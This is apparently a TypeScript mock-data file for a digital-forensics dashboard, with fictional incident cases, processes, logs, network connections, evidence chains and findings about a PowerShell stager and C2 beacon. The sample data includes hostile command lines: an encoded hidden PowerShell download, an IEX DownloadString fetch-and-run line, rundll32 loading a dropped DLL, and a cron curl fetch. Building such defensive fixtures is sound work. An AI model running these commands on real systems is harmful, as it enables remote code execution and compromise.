import {
  Investigation,
  SystemHost,
  ProcessItem,
  FileItem,
  NetworkConnection,
  LogEntry,
  EvidenceItem,
  Finding,
  TimelineEvent,
  ReportItem,
  AuditLog,
  ValidationScenario,
  JockyScriptFile,
  CompilerResult,
  CorrelationGraphData,
  ContinuousLearningData,
  DashboardSummary
} from '../types';

export const MOCK_INVESTIGATIONS: Investigation[] = [
  {
    id: 'JCK-2026-001',
    title: 'APT-42 Lateral Movement & Suspicious Stager Investigation',
    targetSystem: 'WIN-FORENSIC-01',
    platform: 'windows',
    createdDate: '2026-09-28 09:14:22',
    investigator: 'Dr. Sarah Chen, CISSP / GCFE',
    risk: 'critical',
    status: 'analyzing',
    evidenceCount: 32,
    eventsCount: 148,
    findingsCount: 8,
    description: 'Forensic acquisition and triage following anomalous PowerShell invocation, outbound connection to untrusted CIDR, and suspicious binary dropping in %TEMP%.',
    riskScore: 88,
    collectionProgress: 85
  },
  {
    id: 'JCK-2026-002',
    title: 'Ubuntu Web Tier Unauthorized Cron & Socket Probe',
    targetSystem: 'UBUNTU-FORENSIC-02',
    platform: 'ubuntu',
    createdDate: '2026-09-27 14:32:10',
    investigator: 'Marcus Vance, GCFA',
    risk: 'medium',
    status: 'review',
    evidenceCount: 19,
    eventsCount: 92,
    findingsCount: 3,
    description: 'Investigation into unauthorized cron job creation in /etc/cron.d/ matching anomalous egress beacon patterns on port 8443.',
    riskScore: 62,
    collectionProgress: 100
  },
  {
    id: 'JCK-2026-003',
    title: 'Domain Controller Event Log Kerberoasting Audit',
    targetSystem: 'WIN-SEC-SRV-03',
    platform: 'windows',
    createdDate: '2026-09-26 18:05:44',
    investigator: 'Elena Rostova, CISM',
    risk: 'critical',
    status: 'collecting',
    evidenceCount: 44,
    eventsCount: 310,
    findingsCount: 12,
    description: 'Rapid triaging of high volume Event ID 4769 (Kerberos Service Ticket Request with RC4 encryption) indicating potential offline hash extraction.',
    riskScore: 94,
    collectionProgress: 60
  },
  {
    id: 'JCK-2026-004',
    title: 'FinTech Database Ingress Anomaly & Exfiltration Triage',
    targetSystem: 'UBUNTU-DB-01',
    platform: 'ubuntu',
    createdDate: '2026-09-25 11:20:00',
    investigator: 'Dr. Sarah Chen, CISSP / GCFE',
    risk: 'high',
    status: 'open',
    evidenceCount: 14,
    eventsCount: 78,
    findingsCount: 5,
    description: 'Anomalous query frequency and egress spikes observed from database replica toward secondary external IP range.',
    riskScore: 76,
    collectionProgress: 40
  },
  {
    id: 'JCK-2026-005',
    title: 'Workstation Memory Dump & DLL Injection Verification',
    targetSystem: 'WIN-FINANCE-04',
    platform: 'windows',
    createdDate: '2026-09-24 16:45:19',
    investigator: 'David K., EnCE',
    risk: 'low',
    status: 'completed',
    evidenceCount: 26,
    eventsCount: 110,
    findingsCount: 2,
    description: 'Post-incident full memory analysis following quarantined PDF exploit payload. No persistent artifacts found in registry.',
    riskScore: 28,
    collectionProgress: 100
  },
  {
    id: 'JCK-2026-006',
    title: 'DMZ Reverse Proxy Ingress Probe & C2 Beacon Search',
    targetSystem: 'GATEWAY-PRX-01',
    platform: 'ubuntu',
    createdDate: '2026-09-23 08:30:12',
    investigator: 'Marcus Vance, GCFA',
    risk: 'critical',
    status: 'analyzing',
    evidenceCount: 38,
    eventsCount: 220,
    findingsCount: 7,
    description: 'Suspicious TLS certificate mismatch and periodic 60-second jittered TCP beacons detected from proxy container namespace.',
    riskScore: 91,
    collectionProgress: 75
  }
];

export const MOCK_SYSTEMS: SystemHost[] = [
  {
    id: 'SYS-WIN-01',
    hostname: 'WIN-FORENSIC-01',
    ip: '192.168.1.20',
    os: 'Windows 11 Enterprise (Build 22631.3880)',
    platform: 'windows',
    version: 'JOCKY-Collector-v2.4.0',
    status: 'collecting',
    lastSeen: '1 minute ago',
    agentVersion: '2.4.0-win64',
    cpuUsage: 14.2,
    memoryUsage: 48.6,
    activeCaseId: 'JCK-2026-001',
    evidenceCollected: 32
  },
  {
    id: 'SYS-UBNT-02',
    hostname: 'UBUNTU-FORENSIC-02',
    ip: '192.168.1.21',
    os: 'Ubuntu 24.04 LTS (Noble Numbat 6.8.0-35-generic)',
    platform: 'ubuntu',
    version: 'JOCKY-Collector-v2.4.0',
    status: 'online',
    lastSeen: 'Just now',
    agentVersion: '2.4.0-linux64',
    cpuUsage: 8.5,
    memoryUsage: 32.1,
    activeCaseId: 'JCK-2026-002',
    evidenceCollected: 19
  },
  {
    id: 'SYS-WIN-03',
    hostname: 'WIN-SEC-SRV-03',
    ip: '192.168.1.45',
    os: 'Windows Server 2022 Datacenter',
    platform: 'windows',
    version: 'JOCKY-Collector-v2.3.9',
    status: 'warning',
    lastSeen: '4 minutes ago',
    agentVersion: '2.3.9-win64',
    cpuUsage: 78.4,
    memoryUsage: 82.0,
    activeCaseId: 'JCK-2026-003',
    evidenceCollected: 44
  },
  {
    id: 'SYS-UBNT-04',
    hostname: 'UBUNTU-DB-01',
    ip: '192.168.1.88',
    os: 'Ubuntu 22.04.4 LTS (Jammy)',
    platform: 'ubuntu',
    version: 'JOCKY-Collector-v2.4.0',
    status: 'online',
    lastSeen: '2 minutes ago',
    agentVersion: '2.4.0-linux64',
    cpuUsage: 22.1,
    memoryUsage: 64.3,
    activeCaseId: 'JCK-2026-004',
    evidenceCollected: 14
  },
  {
    id: 'SYS-WIN-05',
    hostname: 'WIN-FINANCE-04',
    ip: '192.168.2.14',
    os: 'Windows 10 Pro (22H2)',
    platform: 'windows',
    version: 'JOCKY-Collector-v2.4.0',
    status: 'online',
    lastSeen: '10 minutes ago',
    agentVersion: '2.4.0-win64',
    cpuUsage: 5.1,
    memoryUsage: 28.4,
    activeCaseId: 'JCK-2026-005',
    evidenceCollected: 26
  },
  {
    id: 'SYS-GATEWAY-06',
    hostname: 'GATEWAY-PRX-01',
    ip: '10.0.0.15',
    os: 'Ubuntu 24.04 LTS (Kernel Hardened)',
    platform: 'ubuntu',
    version: 'JOCKY-Collector-v2.4.0',
    status: 'collecting',
    lastSeen: '30 seconds ago',
    agentVersion: '2.4.0-linux64',
    cpuUsage: 34.8,
    memoryUsage: 52.1,
    activeCaseId: 'JCK-2026-006',
    evidenceCollected: 38
  },
  {
    id: 'SYS-WIN-07',
    hostname: 'WIN-DEV-08',
    ip: '192.168.2.99',
    os: 'Windows 11 Pro Workstation',
    platform: 'windows',
    version: 'JOCKY-Collector-v2.4.0',
    status: 'offline',
    lastSeen: '2 hours ago',
    agentVersion: '2.4.0-win64',
    cpuUsage: 0.0,
    memoryUsage: 0.0,
    evidenceCollected: 8
  },
  {
    id: 'SYS-UBNT-08',
    hostname: 'UBUNTU-CI-RUNNER',
    ip: '10.0.4.12',
    os: 'Ubuntu 24.04 LTS Docker Host',
    platform: 'ubuntu',
    version: 'JOCKY-Collector-v2.4.0',
    status: 'online',
    lastSeen: 'Just now',
    agentVersion: '2.4.0-linux64',
    cpuUsage: 45.6,
    memoryUsage: 68.9,
    evidenceCollected: 12
  }
];

export const MOCK_PROCESSES: ProcessItem[] = [
  {
    pid: 4128,
    name: 'suspicious.exe',
    ppid: 1840,
    parentName: 'explorer.exe',
    user: 'NT AUTHORITY\\SYSTEM',
    cpu: '18.4%',
    memory: '142 MB',
    startTime: '2026-09-28 10:21:04',
    path: 'C:\\Windows\\Temp\\suspicious.exe',
    sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
    risk: 'critical',
    status: 'running',
    commandLine: 'C:\\Windows\\Temp\\suspicious.exe --connect 185.220.101.4 --port 443 --stealth-mode',
    connectionsCount: 3,
    relatedEventsCount: 16,
    matchedRules: ['ANOMALOUS_TEMP_EXECUTION', 'UNTRUSTED_FOREIGN_C2', 'PRIVILEGE_ELEVATION_SYSTEM']
  },
  {
    pid: 2840,
    name: 'powershell.exe',
    ppid: 3104,
    parentName: 'cmd.exe',
    user: 'CORP\\admin_john',
    cpu: '6.2%',
    memory: '84 MB',
    startTime: '2026-09-28 10:19:42',
    path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    sha256: '72382e707e719602058b76c81352e85a53e4c4efebc3072c47ea4f9c57d76a75',
    risk: 'high',
    status: 'running',
    commandLine: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAA...',
    connectionsCount: 2,
    relatedEventsCount: 24,
    matchedRules: ['POWERSHELL_BASE64_EXEC_BYPASS', 'HIDDEN_WINDOW_INVOCATION']
  },
  {
    pid: 6720,
    name: 'rundll32.exe',
    ppid: 2840,
    parentName: 'powershell.exe',
    user: 'CORP\\admin_john',
    cpu: '1.1%',
    memory: '24 MB',
    startTime: '2026-09-28 10:20:18',
    path: 'C:\\Windows\\System32\\rundll32.exe',
    sha256: 'c838f712952fe2e5f5f3e9cb4d2847a960fbfa213f56b78082697ffc88ea76b8',
    risk: 'high',
    status: 'running',
    commandLine: 'rundll32.exe C:\\Windows\\Temp\\stager_drop.dll,DllRegisterServer',
    connectionsCount: 1,
    relatedEventsCount: 9,
    matchedRules: ['RUNDLL32_TEMP_DLL_LOADING']
  },
  {
    pid: 5412,
    name: 'python3',
    ppid: 5210,
    parentName: 'bash',
    user: 'ubuntu',
    cpu: '4.8%',
    memory: '62 MB',
    startTime: '2026-09-28 09:44:11',
    path: '/usr/bin/python3',
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    risk: 'medium',
    status: 'running',
    commandLine: 'python3 /opt/collector/probe_daemon.py --interface eth0 --interval 60',
    connectionsCount: 4,
    relatedEventsCount: 8,
    matchedRules: ['PROMISCUOUS_PROBE_SCRIPT']
  },
  {
    pid: 1520,
    name: 'svchost.exe',
    ppid: 760,
    parentName: 'services.exe',
    user: 'NT AUTHORITY\\SYSTEM',
    cpu: '0.4%',
    memory: '38 MB',
    startTime: '2026-09-28 08:00:02',
    path: 'C:\\Windows\\System32\\svchost.exe',
    sha256: '2aae6c35c94fcfb415dbe95f408b9ce91ee846edef5410b939c4e209866eb856',
    risk: 'normal',
    status: 'running',
    commandLine: 'C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p',
    connectionsCount: 8,
    relatedEventsCount: 4,
    matchedRules: []
  },
  {
    pid: 894,
    name: 'auditd',
    ppid: 1,
    parentName: 'systemd',
    user: 'root',
    cpu: '0.9%',
    memory: '18 MB',
    startTime: '2026-09-28 07:15:30',
    path: '/sbin/auditd',
    sha256: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
    risk: 'normal',
    status: 'running',
    commandLine: '/sbin/auditd -s enable',
    connectionsCount: 0,
    relatedEventsCount: 180,
    matchedRules: []
  },
  {
    pid: 1024,
    name: 'sshd',
    ppid: 1,
    parentName: 'systemd',
    user: 'root',
    cpu: '0.1%',
    memory: '12 MB',
    startTime: '2026-09-28 07:16:01',
    path: '/usr/sbin/sshd',
    sha256: 'ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d',
    risk: 'low',
    status: 'running',
    commandLine: '/usr/sbin/sshd -D',
    connectionsCount: 2,
    relatedEventsCount: 15,
    matchedRules: []
  }
];

export const MOCK_FILES: FileItem[] = [
  {
    id: 'FILE-001',
    name: 'stager_drop.dll',
    path: 'C:\\Windows\\Temp\\stager_drop.dll',
    size: '348 KB',
    modified: '2026-09-28 10:20:10',
    sha256: 'a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0',
    type: 'Dynamic Link Library (PE32+)',
    risk: 'critical',
    relatedProcess: 'rundll32.exe (PID 6720)',
    permissions: 'NT AUTHORITY\\SYSTEM: Full, Everyone: Read',
    entropy: 7.84,
    evidenceStatus: 'quarantined',
    matchedYaraRule: 'MAL_SUSPICIOUS_OBFUSCATED_DLL'
  },
  {
    id: 'FILE-002',
    name: 'suspicious.exe',
    path: 'C:\\Windows\\Temp\\suspicious.exe',
    size: '892 KB',
    modified: '2026-09-28 10:21:00',
    sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
    type: 'Portable Executable (PE32+ GUI)',
    risk: 'critical',
    relatedProcess: 'suspicious.exe (PID 4128)',
    permissions: 'Users: Read/Execute, SYSTEM: Full',
    entropy: 7.92,
    evidenceStatus: 'flagged',
    matchedYaraRule: 'STAGER_UNPACKER_GENERIC'
  },
  {
    id: 'FILE-003',
    name: 'sync_service',
    path: '/etc/cron.d/sync_service',
    size: '420 bytes',
    modified: '2026-09-27 14:15:32',
    sha256: 'bc52922ef65352c38cfec7ffab4b2e8112bc207085c7e7b6c3d8a54388e22ec6',
    type: 'Crontab Configuration Script',
    risk: 'medium',
    relatedProcess: 'cron (PID 482)',
    permissions: '-rw-r--r-- 1 root root',
    entropy: 4.12,
    evidenceStatus: 'cataloged',
    matchedYaraRule: 'CRON_REMOTE_FETCH_RULE'
  },
  {
    id: 'FILE-004',
    name: 'audit.log',
    path: '/var/log/audit/audit.log',
    size: '48.2 MB',
    modified: '2026-09-28 10:35:00',
    sha256: 'f4567890123456789abcdef0123456789abcdef0123456789abcdef012345678',
    type: 'ASCII text log file',
    risk: 'clean',
    permissions: '-rw------- 1 root root',
    entropy: 4.88,
    evidenceStatus: 'analyzed'
  },
  {
    id: 'FILE-005',
    name: 'hosts',
    path: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
    size: '824 bytes',
    modified: '2026-09-20 18:22:19',
    sha256: 'e89c09d57a2ab2d0b571343f114f6b1e604f3d2f9549326cbcf74ccbd3ecf8e5',
    type: 'Plaintext System Configuration',
    risk: 'clean',
    permissions: 'SYSTEM: Full, Administrators: Full',
    entropy: 3.25,
    evidenceStatus: 'verified' as any
  },
  {
    id: 'FILE-006',
    name: 'debug_dump.bin',
    path: 'C:\\Users\\Public\\debug_dump.bin',
    size: '14.5 MB',
    modified: '2026-09-28 10:21:45',
    sha256: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
    type: 'Binary raw memory slice',
    risk: 'high',
    relatedProcess: 'suspicious.exe (PID 4128)',
    permissions: 'Everyone: Read/Write',
    entropy: 7.61,
    evidenceStatus: 'flagged'
  }
];

export const MOCK_NETWORK_CONNECTIONS: NetworkConnection[] = [
  {
    id: 'NET-001',
    sourceIp: '192.168.1.20',
    sourcePort: 49210,
    destIp: '185.220.101.4',
    destPort: 443,
    protocol: 'TLS',
    processName: 'suspicious.exe',
    pid: 4128,
    timestamp: '2026-09-28 10:21:15',
    status: 'ESTABLISHED',
    risk: 'critical',
    destinationGeo: 'Netherlands (Tor Exit Relay Node)',
    bytesTransferred: '1.24 MB',
    suspiciousIndicator: 'High entropy TLS payload to known anonymizing exit relay'
  },
  {
    id: 'NET-002',
    sourceIp: '192.168.1.20',
    sourcePort: 51042,
    destIp: '104.244.42.1',
    destPort: 80,
    protocol: 'HTTP',
    processName: 'powershell.exe',
    pid: 2840,
    timestamp: '2026-09-28 10:19:48',
    status: 'CLOSE_WAIT',
    risk: 'high',
    destinationGeo: 'United States (Cloud VPS Provider)',
    bytesTransferred: '348 KB',
    suspiciousIndicator: 'Raw script download via WebClient with no User-Agent'
  },
  {
    id: 'NET-003',
    sourceIp: '192.168.1.20',
    sourcePort: 53535,
    destIp: '192.168.1.45',
    destPort: 88,
    protocol: 'TCP',
    processName: 'rundll32.exe',
    pid: 6720,
    timestamp: '2026-09-28 10:20:25',
    status: 'ESTABLISHED',
    risk: 'high',
    destinationGeo: 'Internal Domain Controller (WIN-SEC-SRV-03)',
    bytesTransferred: '42 KB',
    suspiciousIndicator: 'Kerberos TGS request from non-interactive background worker'
  },
  {
    id: 'NET-004',
    sourceIp: '192.168.1.21',
    sourcePort: 22,
    destIp: '192.168.1.100',
    destPort: 54218,
    protocol: 'TCP',
    processName: 'sshd',
    pid: 1024,
    timestamp: '2026-09-28 09:12:00',
    status: 'ESTABLISHED',
    risk: 'low',
    destinationGeo: 'Internal Admin Subnet',
    bytesTransferred: '8.4 MB'
  },
  {
    id: 'NET-005',
    sourceIp: '192.168.1.20',
    sourcePort: 55432,
    destIp: '8.8.8.8',
    destPort: 53,
    protocol: 'DNS',
    processName: 'svchost.exe',
    pid: 1520,
    timestamp: '2026-09-28 10:18:30',
    status: 'LISTENING',
    risk: 'normal',
    destinationGeo: 'Google Anycast DNS',
    bytesTransferred: '1.2 KB'
  },
  {
    id: 'NET-006',
    sourceIp: '10.0.0.15',
    sourcePort: 443,
    destIp: '198.51.100.77',
    destPort: 52140,
    protocol: 'TLS',
    processName: 'nginx',
    pid: 940,
    timestamp: '2026-09-28 10:30:11',
    status: 'ESTABLISHED',
    risk: 'normal',
    destinationGeo: 'Public Client WAN',
    bytesTransferred: '450 KB'
  }
];

export const MOCK_LOGS: LogEntry[] = [
  {
    id: 'LOG-001',
    timestamp: '2026-09-28 10:21:32',
    source: 'Security',
    eventId: 4688,
    message: 'A new process was created. Creator Subject: CORP\\admin_john, Process Name: C:\\Windows\\Temp\\suspicious.exe, Elevated Token: Yes',
    severity: 'critical',
    relatedProcess: 'suspicious.exe (4128)',
    user: 'CORP\\admin_john'
  },
  {
    id: 'LOG-002',
    timestamp: '2026-09-28 10:21:19',
    source: 'Network',
    eventId: 'SYS-NET-3',
    message: 'Outbound TCP connection initiated to external IP 185.220.101.4 on port 443 by untrusted executable located in Temp directory.',
    severity: 'critical',
    relatedProcess: 'suspicious.exe (4128)',
    user: 'NT AUTHORITY\\SYSTEM'
  },
  {
    id: 'LOG-003',
    timestamp: '2026-09-28 10:20:18',
    source: 'Security',
    eventId: 7045,
    message: 'A service was installed in the system. Service Name: JockyDiagnosticHelper, Service File: C:\\Windows\\Temp\\stager_drop.dll',
    severity: 'high',
    relatedProcess: 'rundll32.exe (6720)',
    user: 'NT AUTHORITY\\SYSTEM'
  },
  {
    id: 'LOG-004',
    timestamp: '2026-09-28 10:19:42',
    source: 'Application',
    eventId: 4104,
    message: 'Executing PowerShell Script Block: IEX (New-Object Net.WebClient).DownloadString(\'http://104.244.42.1/update.ps1\')',
    severity: 'high',
    relatedProcess: 'powershell.exe (2840)',
    user: 'CORP\\admin_john'
  },
  {
    id: 'LOG-005',
    timestamp: '2026-09-28 10:15:00',
    source: 'System',
    eventId: 6005,
    message: 'The Event log service was started successfully.',
    severity: 'info',
    user: 'SYSTEM'
  },
  {
    id: 'LOG-006',
    timestamp: '2026-09-28 09:30:15',
    source: 'Auditd',
    eventId: 'SYSCALL_EXECVE',
    message: 'type=SYSCALL arch=c000003e syscall=59 success=yes comm="curl" exe="/usr/bin/curl" a0="curl" a1="-fsSL" a2="http://104.244.42.1/check"',
    severity: 'medium',
    relatedProcess: 'cron (482)',
    user: 'root'
  },
  {
    id: 'LOG-007',
    timestamp: '2026-09-28 08:44:20',
    source: 'Security',
    eventId: 4624,
    message: 'An account was successfully logged on. Logon Type: 10 (RemoteInteractive/RDP). Subject: CORP\\admin_john.',
    severity: 'low',
    user: 'CORP\\admin_john'
  }
];

export const MOCK_EVIDENCE: EvidenceItem[] = [
  {
    id: 'EVD-2026-001',
    caseId: 'JCK-2026-001',
    title: 'Process Memory Artifact: suspicious.exe',
    source: 'Process',
    timestamp: '2026-09-28 10:25:12',
    sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
    collectionStatus: 'verified',
    integrityStatus: 'verified',
    collectorAgent: 'JOCKY-WinCollector-v2.4.0',
    sizeBytes: '142.4 MB',
    chainOfCustody: [
      { step: 1, action: 'Collected', timestamp: '2026-09-28 10:25:12', actor: 'JOCKY Agent (WIN-FORENSIC-01)', hash: '9f86d081884c...', notes: 'Memory acquisition via live JOCKY forensic driver' },
      { step: 2, action: 'Hashed', timestamp: '2026-09-28 10:25:15', actor: 'JOCKY Integrity Module', hash: '9f86d081884c...', notes: 'SHA-256 and BLAKE3 dual hash computed' },
      { step: 3, action: 'Stored', timestamp: '2026-09-28 10:25:18', actor: 'Forensic Evidence Vault', hash: '9f86d081884c...', notes: 'AES-256-GCM encrypted container write' },
      { step: 4, action: 'Analyzed', timestamp: '2026-09-28 10:27:00', actor: 'JOCKY Compiler IR Engine', hash: '9f86d081884c...', notes: 'Volatile string extraction and PE header validation' },
      { step: 5, action: 'Reviewed', timestamp: '2026-09-28 10:35:40', actor: 'Dr. Sarah Chen, CISSP', hash: '9f86d081884c...', notes: 'Verified stager unpacking routine in Section .text' },
      { step: 6, action: 'Exported', timestamp: '2026-09-28 10:45:00', actor: 'JOCKY Report Generator', hash: '9f86d081884c...', notes: 'Archived into cryptographic court-ready evidence container' }
    ]
  },
  {
    id: 'EVD-2026-002',
    caseId: 'JCK-2026-001',
    title: 'Dropped Binary: C:\\Windows\\Temp\\stager_drop.dll',
    source: 'File',
    timestamp: '2026-09-28 10:26:04',
    sha256: 'a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0',
    collectionStatus: 'verified',
    integrityStatus: 'verified',
    collectorAgent: 'JOCKY-WinCollector-v2.4.0',
    sizeBytes: '348 KB',
    chainOfCustody: [
      { step: 1, action: 'Collected', timestamp: '2026-09-28 10:26:04', actor: 'JOCKY Agent', hash: 'a1b2c3d4e5...', notes: 'Raw sector read preservation of file bytes' },
      { step: 2, action: 'Hashed', timestamp: '2026-09-28 10:26:05', actor: 'JOCKY Integrity Module', hash: 'a1b2c3d4e5...', notes: 'SHA-256 calculated' },
      { step: 3, action: 'Stored', timestamp: '2026-09-28 10:26:08', actor: 'Forensic Evidence Vault', hash: 'a1b2c3d4e5...', notes: 'Placed in tamper-evident evidence directory' },
      { step: 4, action: 'Analyzed', timestamp: '2026-09-28 10:30:00', actor: 'YARA Rule Scanner', hash: 'a1b2c3d4e5...', notes: 'Matched rule MAL_SUSPICIOUS_OBFUSCATED_DLL' }
    ]
  },
  {
    id: 'EVD-2026-003',
    caseId: 'JCK-2026-001',
    title: 'PCAP Capture: Socket Session 185.220.101.4:443',
    source: 'Network',
    timestamp: '2026-09-28 10:21:40',
    sha256: '7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d',
    collectionStatus: 'verified',
    integrityStatus: 'verified',
    collectorAgent: 'JOCKY-NetCap-v2.4.0',
    sizeBytes: '1.24 MB',
    chainOfCustody: [
      { step: 1, action: 'Collected', timestamp: '2026-09-28 10:21:40', actor: 'JOCKY Packet Probe', hash: '7c8d9e...', notes: 'Rolling ring buffer flush for PID 4128' },
      { step: 2, action: 'Hashed', timestamp: '2026-09-28 10:21:42', actor: 'JOCKY Integrity Module', hash: '7c8d9e...', notes: 'SHA-256 computed' },
      { step: 3, action: 'Stored', timestamp: '2026-09-28 10:21:45', actor: 'Vault Storage', hash: '7c8d9e...', notes: 'Secured on cold storage partition' }
    ]
  },
  {
    id: 'EVD-2026-004',
    caseId: 'JCK-2026-001',
    title: 'Windows Security Event Log EVTX Fragment',
    source: 'Log',
    timestamp: '2026-09-28 10:32:00',
    sha256: '456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123',
    collectionStatus: 'collected',
    integrityStatus: 'requires_review',
    collectorAgent: 'JOCKY-WinCollector-v2.4.0',
    sizeBytes: '22.8 MB',
    chainOfCustody: [
      { step: 1, action: 'Collected', timestamp: '2026-09-28 10:32:00', actor: 'JOCKY Event Log Extractor', hash: '456789...', notes: 'Live EVTX channel clone' },
      { step: 2, action: 'Hashed', timestamp: '2026-09-28 10:32:02', actor: 'Integrity Daemon', hash: '456789...', notes: 'Checksum verification pending second pass' }
    ]
  },
  {
    id: 'EVD-2026-005',
    caseId: 'JCK-2026-001',
    title: 'System Metadata Snapshot & Volatile State',
    source: 'System Metadata',
    timestamp: '2026-09-28 10:22:00',
    sha256: '3456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef012',
    collectionStatus: 'verified',
    integrityStatus: 'verified',
    collectorAgent: 'JOCKY-SysInfo-v2.4.0',
    sizeBytes: '4.1 MB',
    chainOfCustody: [
      { step: 1, action: 'Collected', timestamp: '2026-09-28 10:22:00', actor: 'JOCKY System Collector', hash: '345678...', notes: 'System uptime, logged on users, routes, arp cache' },
      { step: 2, action: 'Hashed', timestamp: '2026-09-28 10:22:01', actor: 'Integrity Daemon', hash: '345678...', notes: 'SHA-256 signed' }
    ]
  }
];

export const MOCK_FINDINGS: Finding[] = [
  {
    id: 'FND-2026-01',
    caseId: 'JCK-2026-001',
    title: 'Potentially Suspicious Process Execution in Temporary Directory',
    severity: 'critical',
    confidence: 94,
    relatedEvidenceCount: 12,
    relatedEventsCount: 16,
    status: 'under_review',
    detectedAt: '2026-09-28 10:21:04',
    ruleId: 'JOCKY-RULE-PROC-044',
    ruleName: 'Untrusted Temp Directory Binary Execution',
    description: 'Process suspicious.exe was spawned directly from C:\\Windows\\Temp\\ under SYSTEM privileges with elevated tokens and external network arguments.',
    recommendation: 'Quarantine executable file, preserve memory dump slice, examine parent PID 1840 token inheritance, and block destination CIDR 185.220.101.0/24.',
    investigatorNotes: [
      'Preliminary YARA scan detected packed code stub with high entropy (7.92).',
      'Child socket connected to Netherlands IP within 11 seconds of process spawn.'
    ]
  },
  {
    id: 'FND-2026-02',
    caseId: 'JCK-2026-001',
    title: 'Obfuscated PowerShell Invocation with Hidden Window Flag',
    severity: 'high',
    confidence: 89,
    relatedEvidenceCount: 8,
    relatedEventsCount: 24,
    status: 'confirmed',
    detectedAt: '2026-09-28 10:19:42',
    ruleId: 'JOCKY-RULE-PS-012',
    ruleName: 'Base64 Encoded Script Block Execution',
    description: 'Command line contains base64 encoded stream with explicit -ExecutionPolicy Bypass and -WindowStyle Hidden parameters, downloading remote payload.',
    recommendation: 'Decode script block in sandboxed environment; correlate URL indicator http://104.244.42.1/ with gateway proxy logs.',
    investigatorNotes: [
      'Base64 decoded successfully to Net.WebClient download stager.',
      'Analyst marked confirmed malicious stager on 2026-09-28 10:40.'
    ]
  },
  {
    id: 'FND-2026-03',
    caseId: 'JCK-2026-001',
    title: 'Anomalous Egress TLS Beacon to Anonymizing Exit Relay',
    severity: 'high',
    confidence: 87,
    relatedEvidenceCount: 6,
    relatedEventsCount: 10,
    status: 'under_review',
    detectedAt: '2026-09-28 10:21:15',
    ruleId: 'JOCKY-RULE-NET-088',
    ruleName: 'Egress Beacon to Known Tor / Proxy Exit',
    description: 'Direct outbound TLS connection established to 185.220.101.4 on port 443 with self-signed certificate signature and periodic keepalive pulses.',
    recommendation: 'Inspect JA3/JA3S TLS fingerprint hashes; cross-reference with threat intelligence feeds.',
    investigatorNotes: [
      'JA3 hash matches known Cobalt Strike / generic malleable C2 profile.'
    ]
  },
  {
    id: 'FND-2026-04',
    caseId: 'JCK-2026-001',
    title: 'High Entropy Dynamic Library Dropped in System Location',
    severity: 'medium',
    confidence: 78,
    relatedEvidenceCount: 5,
    relatedEventsCount: 9,
    status: 'under_review',
    detectedAt: '2026-09-28 10:20:10',
    ruleId: 'JOCKY-RULE-FILE-027',
    ruleName: 'Suspicious High Entropy DLL Creation',
    description: 'File stager_drop.dll created with entropy value of 7.84, indicating packed or encrypted payload content.',
    recommendation: 'Perform controlled sandbox static and dynamic extraction.',
    investigatorNotes: [
      'File has been isolated in quarantined forensic store.'
    ]
  },
  {
    id: 'FND-2026-05',
    caseId: 'JCK-2026-001',
    title: 'New Service Registration Event from Unregistered Provider',
    severity: 'low',
    confidence: 72,
    relatedEvidenceCount: 3,
    relatedEventsCount: 4,
    status: 'under_review',
    detectedAt: '2026-09-28 10:20:18',
    ruleId: 'JOCKY-RULE-SVC-005',
    ruleName: 'Event ID 7045 Service Installation',
    description: 'Service JockyDiagnosticHelper registered pointing to temporary directory binary without valid digital signature.',
    recommendation: 'Validate registry service key HKLM\\SYSTEM\\CurrentControlSet\\Services\\JockyDiagnosticHelper.',
    investigatorNotes: []
  }
];

export const MOCK_TIMELINE: TimelineEvent[] = [
  {
    id: 'TLE-01',
    timestamp: '2026-09-28 10:19:42',
    timeOnly: '10:19:42',
    title: 'Obfuscated PowerShell Process Started',
    description: 'Process powershell.exe (PID 2840) launched with base64 encoded parameters.',
    category: 'process',
    severity: 'high',
    user: 'CORP\\admin_john',
    details: { PID: '2840', PPID: '3104', Command: 'powershell.exe -EncodedCommand ...' }
  },
  {
    id: 'TLE-02',
    timestamp: '2026-09-28 10:19:48',
    timeOnly: '10:19:48',
    title: 'Remote Web Payload Download Connection',
    description: 'Outbound HTTP request to http://104.244.42.1/update.ps1 initiated by WebClient.',
    category: 'network',
    severity: 'high',
    user: 'CORP\\admin_john',
    details: { DestIP: '104.244.42.1', Port: '80', Bytes: '348 KB' }
  },
  {
    id: 'TLE-03',
    timestamp: '2026-09-28 10:20:10',
    timeOnly: '10:20:10',
    title: 'File Created: stager_drop.dll',
    description: 'Binary payload stager_drop.dll written to C:\\Windows\\Temp\\ directory.',
    category: 'file',
    severity: 'medium',
    user: 'CORP\\admin_john',
    details: { Path: 'C:\\Windows\\Temp\\stager_drop.dll', Size: '348 KB', Entropy: '7.84' }
  },
  {
    id: 'TLE-04',
    timestamp: '2026-09-28 10:20:18',
    timeOnly: '10:20:18',
    title: 'Service Registration Event (Event ID 7045)',
    description: 'Windows Service Control Manager logged installation of JockyDiagnosticHelper.',
    category: 'log',
    severity: 'high',
    user: 'SYSTEM',
    details: { EventID: '7045', ServiceName: 'JockyDiagnosticHelper' }
  },
  {
    id: 'TLE-05',
    timestamp: '2026-09-28 10:21:04',
    timeOnly: '10:21:04',
